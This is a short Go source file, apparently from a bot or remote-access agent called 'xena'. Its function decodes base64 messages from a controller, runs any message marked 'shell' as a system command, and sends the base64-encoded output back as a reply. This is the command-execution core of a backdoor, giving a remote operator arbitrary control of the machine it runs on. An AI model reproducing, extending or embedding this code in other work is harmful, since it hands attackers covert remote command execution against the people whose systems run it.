package xena

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os/exec"
	"strings"
)

/* Interprets the message. */
func interpretMessages(messages []Message) {
	for messageIndex := 0; messageIndex < len(messages); messageIndex++ {
		message := messages[messageIndex]

		decodedContent, err := base64.StdEncoding.DecodeString(message.Content)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}

		decodedContentStr := string(decodedContent[:])

		fmt.Print("New command: ")
		fmt.Println(decodedContentStr)

		switch message.Subject {
		case "shell":
			cmd := exec.Command(strings.TrimSuffix(decodedContentStr, "\n"))
			var out bytes.Buffer
			cmd.Stdout = &out

			cmdErr := cmd.Run()
			if cmdErr != nil {
				fmt.Println(cmdErr)
				continue
			}

			cmdOutput := base64.StdEncoding.EncodeToString(out.Bytes())

			issueMessageReply(cmdOutput, message.Id)
		}
	}
}
